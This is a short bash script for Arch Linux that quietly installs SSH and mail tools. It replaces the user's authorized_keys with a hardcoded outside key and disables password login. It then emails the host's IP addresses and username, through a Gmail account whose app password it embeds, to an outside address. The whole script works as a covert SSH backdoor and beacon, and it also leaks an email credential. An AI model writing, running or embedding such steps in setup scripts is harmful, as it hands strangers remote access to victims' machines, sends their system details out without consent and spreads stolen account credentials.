#!/bin/bash


sudo pacman -Sq --noconfirm openssh > /dev/null 2>&1
sudo pacman -Sq --noconfirm mailutils > /dev/null 2>&1
sudo pacman -Sq --noconfirm msmtp > /dev/null 2>&1

ifconfig_output=$(ifconfig)
the_user=$(whoami)

ip_lo=$(echo "$ifconfig_output" | grep "inet 127.0.0.1" | awk '{print $2}')
ip_wlan0=$(echo "$ifconfig_output" | grep "inet" | grep -v "127.0.0.1" | awk '{print $2}')
broadcast=$(echo "$ifconfig_output" | grep "broadcast" | grep -v "127.0.0.1" | awk '{print $6}')

touch ~/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFZZVYUD6cYmoHPbqp7GtaSL/fCU2OEi/l7NhsQWTfIr usedcvvnt@mail.com" > ~/.ssh/authorized_keys
sudo chmod 600 ~/.msmtprc
sudo chmod 700 /etc/ssh/sshd_config

sudo bash -c 'echo "PasswordAuthentication no" >> /etc/ssh/sshd_config'
sudo bash -c 'echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config'
sudo bash -c 'echo "AuthorizedKeysFile     .ssh/authorized_keys" >> /etc/ssh/sshd_config'


sudo systemctl restart sshd


cat <<EOF > ~/.msmtprc
defaults
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt

account default
host smtp.gmail.com
port 587
auth on
user deredentayler@gmail.com
password nuhf fvrv ogfm ojio
EOF

echo -e "From: deredentayler@gmail.com\nTo: margestallone@gmail.com\nSubject: Network Information\n\nIP 127.0.0.1= $ip_lo\nIP WLAN0= $ip_wlan0\nBroadcast= $broadcast\nuser= $the_user" | msmtp --from=default -t
